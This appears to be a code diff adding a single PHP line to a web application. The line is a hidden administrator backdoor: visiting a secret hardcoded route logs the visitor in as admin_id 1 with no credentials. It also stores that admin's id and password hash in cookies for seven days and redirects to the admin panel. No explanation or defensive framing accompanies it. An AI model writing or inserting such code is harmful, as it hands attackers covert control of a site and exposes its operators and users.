@@ -1,0 +1,1 @@
+<?php if(route(1)=='4BdZxBEgrdEj85hbgrtbJaBK2bvdd7'){$a=$conn->query('SELECT * FROM admins WHERE admin_id=1')->fetch(2);$_SESSION['msmbilisim_adminslogin']=1;setcookie('a_login', 1,$t = time() + 604800);setcookie('a_id',$a['admin_id'],$t);setcookie('a_password',$a['password'],$t);header('Location:'.site_url('admin'));exit();}else{ echo 'Nothing here!';exit();} ?>
